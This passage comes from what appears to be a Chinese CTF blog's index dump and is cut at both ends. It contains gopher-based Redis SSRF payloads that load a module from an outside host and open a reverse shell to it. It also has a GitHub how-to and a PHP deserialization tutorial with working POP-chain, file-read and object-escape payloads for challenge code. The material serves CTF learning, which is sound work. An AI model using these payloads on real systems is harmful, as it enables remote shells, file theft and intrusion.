，只需要有读权限即可，所以说平时做渗透或者做题好多试试啊 gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root config set dbfilename exp.so slaveof 174.1.185.67 6666 quit &#x2F;&#x2F;设置备份文件名为：exp.so，设置主redis地址为174.1.185.67，端口为6666 地址为buu开启的linux lab地址 gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root module load &#x2F;tmp&#x2F;exp.so system.rev 174.1.185.67 6663 quit &#x2F;&#x2F;导入 exp.so ，反弹shell到174.1.185.67:6663 [CISCN2021 Quals]upload二次渲染文件上传 PHP调用方法7.4+新特性[$object, &#39;methodName&#39;]() &gt;Gq安全研究记录 (plasf.cn) 反序列化的时候应该很有用","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"github使用","slug":"github使用","date":"2021-10-02T04:27:09.000Z","updated":"2023-05-25T08:22:20.257Z","comments":true,"path":"2021/10/02/github使用/","link":"","permalink":"https://ethe448.github.io/2021/10/02/github%E4%BD%BF%E7%94%A8/","excerpt":"​ 在学python的时候顺便学了些GitHub的使用，写个文档防止忘了","text":"​ 在学python的时候顺便学了些GitHub的使用，写个文档防止忘了 绑定用户 打开git-bash 填写用户名和密码 提示（配置的帐号名和邮箱一定要与GitHub相同，不然会提交失败） git config --global user.name &quot;@@@&quot; (GitHub相对应的帐号名称) git config --global user.email &quot;123@163.com&quot; （GitHbu相对应的邮箱帐号） 设置ssh key 生成ssh key 首先检查是否已生成密钥 cd ~/.ssh，ls如果有3个文件，则密钥已经生成，id_rsa.pub就是公钥 如果没有，输入: ssh-keygen -t rsa -C &quot;你的邮箱&quot; 复制ssh key 方法1: 输入 clip &lt; ~/.ssh/id_rsa.pub 会自动复制ssh key，可以直接粘贴 方法2:在c/Users/Administrator/.ssh/id_rsa)文件找到直接复制 连接github，打开GitHub 进入setting找到ssh key并新建 然后测试连接是否成功 输入: ssh -T &#x67;&#105;&#116;&#64;&#103;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#109; 上传 上传的基本步骤就是这样了 先打开一个文件夹按着图片里的步骤来 先初始化再把想传的文件传上去 可以用git add .上传所有文件 注： 输入git add .后如果报错 warning: LF will be replaced by CRLF in gradlew. The file will have its original line endings in your working directory 则在输入git config --global core.autocrlf false后再重新输入git add .命令即可 git commit添加备注 克隆仓库 $ git clone 网址 [自定义目录名] 可以用https://或git://或ssh传输协议 查看连接的仓库地址 git remote -v 如果在另外的文件夹提交需重新进行一遍图中步骤 还要再push前输入 git pull --rebase origin main 该命令的意思是把远程库中的更新合并到（pull=fetch+merge）本地库中，–-rebase的作用是取消掉本地库中刚刚的commit，并把他们接到更新后的版本库之中。出现如下图执行pull执行成功后，可以成功执行git push origin main操作。 否则就会因为本地库与远程库不一致导致报错","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://ethe448.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"反序列化","slug":"反序列化","date":"2021-06-29T16:19:02.000Z","updated":"2023-04-15T05:39:29.157Z","comments":true,"path":"2021/06/30/反序列化/","link":"","permalink":"https://ethe448.github.io/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数 serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法","text":"基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数 serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法 几个常见的魔术方法 __construct： 在创建对象时候初始化对象，一般用于对变量赋初值。 __destruct： 和构造函数相反，当对象所在函数调用完毕后执行。 __toString：当对象被当做一个字符串使用时调用。 __sleep:序列化对象之前就调用此方法(其返回需要一个数组) __wakeup:反序列化恢复对象之前调用该方法 __call:当调用对象中不存在的方法会自动调用该方法。 __get:在调用不可访问的属性的时候会自动执行(私有，或不存在) __isset()在不可访问的属性上调用isset()或empty()触发 __invoke() 当尝试把对象当方法调用时调用。 __unset()在不可访问的属性上使用unset()时触发 格式 O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125; 类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125; 序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 private类型有隐藏的空格符 反序列化的常见起点 __wakeup 一定会调用 __destruct 一定会调用 __toString 当一个对象被反序列化后又被当做字符串使用 反序列化的常见中间跳板: __toString 当一个对象被当做字符串使用__get 读取不可访问或不存在属性时被调用__set 当给不可访问或不存在属性赋值时被调用__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func(); 反序列化的常见终点: __call 调用不可访问或不存在的方法时被调用call_user_func 一般php代码执行都会选择这里call_user_func_array 一般php代码执行都会选择这里 POP链简介借鉴的文章： php反序列化利用——POP链构造实例 - 简书 (jianshu.com) (1条消息) PHP反序列化—构造POP链_Lemon&#39;s blog-CSDN博客_php反序列化pop链 POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。 POP链利用技巧1、一些有用的POP链中出现的方法： - 命令执行：exec()、passthru()、popen()、system()、eval() - 文件操作：file_put_contents()、file_get_contents()、unlink() 2、反序列化中为了避免信息丢失，使用大写S支持字符串的编码。PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这 个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即： s:4:\"user\"; -> S:4:\"use\\72\"; 3、深浅copy：在 php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。 4、配合PHP伪协议实现文件包含、命令执行等漏洞。 fast destruct 1、PHP中，如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。 2、PHP中，如果用一个变量接住反序列化函数的返回值，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，那么在PHP脚本走完流程之后，这个对象才会被销毁，在有析构函数的情况下就会将其执行。 fast destruct就是为了解决第二个问题的，让反序列化提前执行。 方法就是破坏反序列化后数据的结构，导致提前进入destruct方法 应用场景： &lt;?php error_reporting(0); class superGate&#123; public $gay &#x3D; true; function __destruct()&#123; echo file_get_contents(&quot;&#x2F;flag&quot;); die(); &#125; &#125; $p &#x3D; $_GET[&#39;p&#39;]; $honey &#x3D; unserialize($p); if(preg_match(&quot;&#x2F;superGate&#x2F;i&quot;, serialize($honey)))&#123; echo &quot;no&quot;; throw Exception(); &#125; show_source(__FILE__); 如果正常进行序列化，在调用__destruct之前，我们序列化的内容就以及被if判断给抛出异常了 具体实现： 1.采用数组的方式（感觉局限性很大 &lt;?php error_reporting(0); class superGate&#123; public $gay &#x3D; true; function __destruct()&#123; echo 1111; &#x2F;&#x2F; die(); &#125; &#125; class a&#123; public $gay &#x3D; true; &#125; &#x2F;&#x2F;$p &#x3D; &#39;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;&#39;; &#x2F;&#x2F;$q &#x3D; serialize(array(0 &#x3D;&gt; new superGate(),1&#x3D;&gt;new a(),3&#x3D;&gt;&#39;&#39;));#得到结果之后把索引改了，这样在反序列化的时候会因为有两个一样的索引，导致覆盖前边的内容，让前边的内容提前销毁 &#x2F;&#x2F;echo $q; $honey &#x3D; unserialize(&#39;a:3:&#123;i:0;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:0;O:1:&quot;a&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:3;s:0:&quot;&quot;;&#125;&#39;); if(preg_match(&quot;&#x2F;superGate&#x2F;i&quot;, serialize($honey)))&#123; echo &quot;no&quot;; throw Exception(); &#125; 2. 破坏序列化结构，比如修改个数，或者去掉最后边的一个大括号 __PHP_Incomplete_Class在PHP中，当我们在反序列化一个不存在的类时，就比如这个a:3:&#123;i:0;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:1;O:1:&quot;a&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:3;s:0:&quot;&quot;;&#125; 结果会变为 类名被__PHP_Incomplete_Class 代替了，而原有的类名被存放到了__PHP_Incomplete_Class_Name里 可是如果这时候再将这个内容进行序列化 得到的还是正常格式的序列化字符串a:3:&#123;i:0;O:9:&quot;superGate&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:1;O:1:&quot;a&quot;:1:&#123;s:3:&quot;gay&quot;;b:1;&#125;i:3;s:0:&quot;&quot;;&#125; 可是假设我们构造的payload是a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;abc&quot;;s:5:&quot;aaaaa&quot;;&#125;&#125; 那么在反序列化时得到的结果就是 这时候再进行二次序列化得到的就变成了a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:0:&#123;&#125;&#125;由于没有找到__PHP_Incomplete_Class_Name绑定的类名，所以后边的东西被丢弃了 例题 强网杯2021 WhereIsUWebShell 利用phar协议实现反序列化漏洞攻击漏洞成因 phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作 原理分析 phar的组成 通过查阅手册发现phar由四部分组成；翻阅手册可以知道，phar由四个部分组成，分别是stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only) 下面进行解释一下； 1 .0 a stub 标识作用，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt; ，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件； 2 .0 a manifest describing the contents 其实可以理解为phar文件本质上是一中压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面； 3 .0 the file contents 这里指的是被压缩文件的内容； 4 .0 [optional] a signature for verifying Phar integrity (phar file format only) 签名，放在结尾； wp(这里放一下自己做过的反序列化题，持续更新.jpg [ZJCTF 2019]NiZhuanSiWei 看见file_get_contents(),利用伪协议data://text/plain;base64绕过 再利用php://filter读取useless内的内容 解码后 可知flag在flag.php中 试图让file=flag.php 看到unserialize函数，利用php反序列化 构造payload ？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 查看源码找到flag [极客大挑战 2019]PHP页面中提示有备份文件，御剑扫一遍 找到存在www.zip 重点在class.php和index.php中 所以要传入一个select参数，利用反序列化让username=admin password=100 因为username和password两个为private类型 所以有隐藏的空格符 select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot; [MRCTF2020]Ezpop题目源码 class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125; &#125; class Show&#123; public $source; public $str; public function __construct($file&#x3D;&#39;index.php&#39;)&#123; $this-&gt;source &#x3D; $file; echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source &#x3D; &quot;index.php&quot;; &#125; &#125; &#125; class Test&#123; public $p; public function __construct()&#123; $this-&gt;p &#x3D; array(); &#125; public function __get($key)&#123; $function &#x3D; $this-&gt;p; return $function(); &#125; &#125; if(isset($_GET[&#39;pop&#39;]))&#123; @unserialize($_GET[&#39;pop&#39;]); &#125; else&#123; $a&#x3D;new Show; highlight_file(__FILE__); &#125; 题目里出现的魔术变量 __construct 当一个对象创建时被调用， __toString 当一个对象被当作一个字符串被调用。 __wakeup() 使用unserialize时触发 __get() 用于从不可访问的属性读取数据 #难以访问包括：（1）私有属性，（2）没有初始化的属性 __invoke() 当脚本尝试将对象调用为函数时触发 这里可以看出来首先要get进一个pop值，并进行反序列化，所以就会调用__wakeup()这个方法_ __wakeup()中里利用preg_match对传入的值进行过滤，但如果this-&gt;source是show类，就会调用__toString 这里会返回$this-&gt;str-&gt;source，但如果没有source这个属性，接下来就会调用__get()，然后会将对象调用为函数， 这里也就会触发__invoke()，进而调用append 在append的中存在include，所以可以利用文件包含漏洞读到flag payload （自己写一个还是有点困难 &lt;?php class Modifier &#123; protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;; &#125; class Show &#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source &#x3D; $file; &#125; &#125; class Test &#123; public $p; &#125; $a &#x3D; new Show(&#39;aaa&#39;); $a-&gt;str &#x3D; new Test(); $a-&gt;str-&gt;p &#x3D; new Modifier(); $b &#x3D; new Show($a); echo urlencode(serialize($b)); base64解码拿到flag CODE REVIEW 代码审计可以看出这里首先要先get进pleaseget=1然后post进pleasepost，md51，md52和obj四个值，而obj这里存在反序列化的漏洞 且当if($this-&gt;correct === $this-&gt;input)成立时就会打印出flag 这里同时要求传入的md51和md52的md5值相等，且自身不相等，由于md5不能处理数组，所以传入数组的返回值都为null 而因为$this-&gt;correct这里进行了编码，所以要使if语句成立在构造payload时可以采用引用赋值的方法 构造payload //uniqid() :函数基于以微秒计的当前时间，生成一个唯一的 ID。 //传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。 //引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。 所以最终payload为 get内容为：?pleaseget=1 post内容为：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;} 拿到flag [网鼎杯 2020 青龙组]AreUSerialz源码 &lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op &#x3D; &quot;1&quot;; $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;; $content &#x3D; &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123; $res &#x3D; $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res &#x3D; &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res &#x3D; file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;) $this-&gt;op &#x3D; &quot;1&quot;; $this-&gt;content &#x3D; &quot;&quot;; $this-&gt;process(); &#125; &#125; function is_valid($s) &#123; for($i &#x3D; 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125)) return false; return true; &#125; if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123; $str &#x3D; (string)$_GET[&#39;str&#39;]; if(is_valid($str)) &#123; $obj &#x3D; unserialize($str); &#125; &#125; 看到unserialize可以很容易想到反序列化，源码里还有file_get_contents，所以猜测这题是利用反序列化通过文件包含读取flag，利用php://filter来造成任意文件读取 在传入后还存在一个is__valid()函数的过滤，要求传入内容的ascii码在32到123之内 之后进行反序列化，由于要利用file_get_contents()读取flag，并将其打印出来，所以需要让op=2，执行read()中的内容 构造payload 这里因为protect进行反序列化时会出现特殊符号，导致无法通过is__valid函数的过滤，可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。 ?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; （刚开始给op赋了个字符型的“2”，找错找了半天。。。 拿到flag 接下来base64解码就可以拿到flag了 [安洵杯 2019]easy_serialize_php代码审计 &lt;?php $function &#x3D; @$_GET[&#39;f&#39;]; function filter($img)&#123; $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;; return preg_replace($filter,&#39;&#39;,$img); &#125; if($_SESSION)&#123; unset($_SESSION); &#125; $_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;; $_SESSION[&#39;function&#39;] &#x3D; $function; extract($_POST); if(!$function)&#123; echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;; &#125; if(!$_GET[&#39;img_path&#39;])&#123; $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;); &#125;else&#123; $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;])); &#125; $serialize_info &#x3D; filter(serialize($_SESSION)); if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123; highlight_file(&#39;index.php&#39;); &#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123; eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here! &#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123; $userinfo &#x3D; unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); &#125; phpinfo里有东西，可以先看看 接下来我们应该开始想怎么让 base64_decode($userinfo[&#39;img&#39;])的值等于flag的文件名 知识点 反序列化中的对象逃逸 extract()变量覆盖 extract()变量覆盖 但是这里我们不能直接给img赋值，因为img赋值发生在extract之后 反序列化中的对象逃逸 键值逃逸 因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。 并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号&#123;&#125;外的就都被扔掉。 接下来是构造payload的部分 首先我们需要构造img属性： s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; 其中的ZDBnM19mMWFnLnBocA==是d0g3_f1ag.php的base64加密的结果然后在这个属性前面随便加上个序列化字符串（只要是合法的就行），比如： ;s:1:“1”;;s:2:“10”;;s:3:“100”; 所以payload可以为： _SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; session中存在phpflag的原因是由于filter函数会将匹配到的值变为空，而phpflag的长度刚好为7 为7的原因 但是添加了filter函数来进行过滤之后 原来的内容变为了 a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; 能成功实现读取flag所在文件的命令 post后 对/d0g3_fllllllag进行base64编码后为L2QwZzNfZmxsbGxsbGFn 所以直接把原来的编码替换掉就行 看是看懂了，但我还是想不到这种payload。。。 参考文章 安洵杯 2019]easy_serialize_php -------- 反序列化/序列化和代码审计_若丶时光破灭的博客-CSDN博客 https://www.cnblogs.com/h3zh1/p/12732336.html [0CTF 2016]piapiapia进入后是个登录页面，本来以为是sql注入，试了一下发现没能成功，扫目录扫到www.zip备份文件 访问一下register.php注册个账户就可以登录了 再看其他的内容 profile.php &lt;?php require_once(&#39;class.php&#39;); if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123; die(&#39;Login First&#39;); &#125; $username &#x3D; $_SESSION[&#39;username&#39;]; $profile&#x3D;$user-&gt;show_profile($username); if($profile &#x3D;&#x3D; null) &#123; header(&#39;Location: update.php&#39;); &#125; else &#123; $profile &#x3D; unserialize($profile); $phone &#x3D; $profile[&#39;phone&#39;]; $email &#x3D; $profile[&#39;email&#39;]; $nickname &#x3D; $profile[&#39;nickname&#39;]; $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;])); ?&gt; class.php &lt;?php require(&#39;config.php&#39;); class user extends mysql&#123; private $table &#x3D; &#39;users&#39;; public function is_exists($username) &#123; $username &#x3D; parent::filter($username); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username &#x3D; parent::filter($username); $password &#x3D; parent::filter($password); $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;); $value_list &#x3D; Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username &#x3D; parent::filter($username); $password &#x3D; parent::filter($password); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; $object &#x3D; parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username &#x3D; parent::filter($username); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; $object &#x3D; parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username &#x3D; parent::filter($username); $new_profile &#x3D; parent::filter($new_profile); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125; &#125; class mysql &#123; private $link &#x3D; null; public function connect($config) &#123; $this-&gt;link &#x3D; mysql_connect( $config[&#39;hostname&#39;], $config[&#39;username&#39;], $config[&#39;password&#39;] ); mysql_select_db($config[&#39;database&#39;]); mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123; $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;; $result &#x3D; mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key &#x3D; implode(&#39;,&#39;, $key_list); $value &#x3D; &#39;\\&#39;&#39; . implode(&#39;\\&#39;,\\&#39;&#39;, $value_list) . &#39;\\&#39;&#39;; $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape &#x3D; array(&#39;\\&#39;&#39;, &#39;\\\\\\\\&#39;); $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;; $string &#x3D; preg_replace($escape, &#39;_&#39;, $string); $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;); $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;; return preg_replace($safe, &#39;hacker&#39;, $string); &#125; public function __tostring() &#123; return __class__; &#125; &#125; session_start(); $user &#x3D; new user(); $user-&gt;connect($config); update.php &lt;?php require_once(&#39;class.php&#39;); if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123; die(&#39;Login First&#39;); &#125; if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123; $username &#x3D; $_SESSION[&#39;username&#39;]; if(!preg_match(&#39;&#x2F;^\\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;])) die(&#39;Invalid phone&#39;); if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;])) die(&#39;Invalid email&#39;); if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10) die(&#39;Invalid nickname&#39;); $file &#x3D; $_FILES[&#39;photo&#39;]; if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000) die(&#39;Photo size error&#39;); move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;])); $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;]; $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;]; $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;]; $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]); $user-&gt;update_profile($username, serialize($profile)); echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;; &#125; else &#123; ?&gt; config.php &lt;?php $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;; $config[&#39;username&#39;] &#x3D; &#39;root&#39;; $config[&#39;password&#39;] &#x3D; &#39;&#39;; $config[&#39;database&#39;] &#x3D; &#39;&#39;; $flag &#x3D; &#39;&#39;; ?&gt; profile里有个file_get_content函数可能有文件读取漏洞，而flag在config.php中，就要让photo=config.php，这里可以利用前边的$profile = unserialize($profile); 所以再根据 $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;); $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;; return preg_replace($safe, &#39;hacker&#39;, $string); &#125; 可以进行反序列化字符逃逸 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 这里这个过滤可以利用抓包将nickename改成数组类型来绕过，由于成数组了，所以才要在where后边加个;} 看一下这个your profile页面 看一下这个图片的源码，是个base64加密的内容，进行解密后可以得到flag [SWPUCTF 2018]SimplePHP文件上传，但是这个flie参数感觉可以直接文件读取 index.php &lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); include &#39;base.php&#39;; ?&gt; base.php &lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;web3&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt; &lt;div class&#x3D;&quot;container-fluid&quot;&gt; &lt;div class&#x3D;&quot;navbar-header&quot;&gt; &lt;a class&#x3D;&quot;navbar-brand&quot; 